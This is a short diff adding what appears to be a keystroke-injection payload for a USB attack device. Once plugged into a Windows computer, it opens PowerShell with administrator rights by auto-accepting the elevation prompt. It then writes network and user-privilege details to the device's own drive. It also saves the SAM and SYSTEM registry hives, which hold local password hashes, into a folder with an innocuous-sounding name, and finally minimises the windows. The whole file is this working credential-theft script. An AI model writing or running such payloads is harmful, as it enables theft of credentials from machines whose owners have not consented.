@@ -1,0 +1,28 @@
+ATTACKMODE HID STORAGE
+LED R
+QUACK GUI r
+QUACK STRING powershell
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING "exit Start-Process powershell -Verb RunAs"
+QUACK ENTER
+QUACK DELAY 2200
+QUACK ALT Y
+QUACK DELAY 1000
+QUACK STRING "ipconfig /all | Out-File -FilePath 'D:\nothingwashereorwillhappen\IP.txt'"
+QUACK ENTER
+QUACK DELAY 100
+QUACK STRING "whoamI /all | Out-File -FilePath 'D:\nothingwashereorwillhappen\waitwhoamI.txt'"
+QUACK ENTER
+QUACK DELAY 100
+QUACK STRING "reg save HKLM\sam D:\nothingwashereorwillhappen\whoisSAManyway.save"
+QUACK ENTER
+QUACK DELAY 100
+QUACK STRING "reg save HKLM\system D:\nothingwashereorwillhappen\itsSAMSsystem.save"
+QUACK ENTER
+QUACK DELAY 150
+QUACK STRING "exit"
+QUACK ENTER
+QUACK GUI m
+ATTACKMODE OFF
+LED G
